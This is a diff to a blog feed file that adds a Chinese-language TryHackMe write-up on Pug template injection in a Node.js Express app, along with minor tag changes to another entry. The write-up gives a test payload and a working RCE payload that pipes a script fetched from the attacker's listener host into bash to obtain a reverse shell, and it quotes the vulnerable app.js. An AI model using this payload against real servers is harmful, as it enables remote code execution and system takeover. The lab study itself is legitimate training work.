@@ -4,6 +4,39 @@
   
     
     <entry>
+      <title>TemplatesTHM</title>
+      <link href="/2024/06/14/TemplatesTHM/"/>
+      <url>/2024/06/14/TemplatesTHM/</url>
+      
+        <content type="html"><![CDATA[<h1 id="PUG模板SSTI"><a href="#PUG模板SSTI" class="headerlink" title="PUG模板SSTI"></a>PUG模板SSTI</h1><p>根据房间提示，是Nodejs的PUG模板SSTI</p><p>根据: <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></p><p>尝试payload</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#{7*7}</span><br></pre></td></tr></tbody></table></figure><p>返回49,存在SSTI,在本地写一个反弹shell然后开启web服务器，开启监听</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl http://10.11.77.28:8000/s.sh | bash')}()}</span><br></pre></td></tr></tbody></table></figure><p>拿到shell</p><p>app.js源码:</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">const express = require("express")</span><br><span class="line">const pug = require("pug")</span><br><span class="line">var bodyParser = require("body-parser")</span><br><span class="line"></span><br><span class="line">const app = express()</span><br><span class="line">app.set("view engine", "pug")</span><br><span class="line">app.use(bodyParser.urlencoded({ extended: true }))</span><br><span class="line"></span><br><span class="line">app.get("/", function (req, res) {</span><br><span class="line">  res.render("index")</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">app.post("/render", function (req, res) {</span><br><span class="line">  template = req.body.template || "h1 No template provided"</span><br><span class="line"></span><br><span class="line">  value = pug.render(template)</span><br><span class="line">  res.render("render", { value: value })</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p>value = pug.render(template) 这里存在模板注入,似乎express框架的SSTI都在render这里产生,render用于服务端渲染并且将html页面发送给客户端</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> Nodejs </tag>
+            
+            <tag> SSTi </tag>
+            
+            <tag> 打靶 </tag>
+            
+            <tag> Linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>打靶记录(一一七)之Exfilibur</title>
       <link href="/2024/06/06/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%80%E4%B8%83)%E4%B9%8BExfilibur/"/>
       <url>/2024/06/06/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%80%E4%B8%83)%E4%B9%8BExfilibur/</url>
@@ -20,13 +53,11 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
-            <tag> Linux </tag>
+            <tag> Windows </tag>
             
         </tags>
       
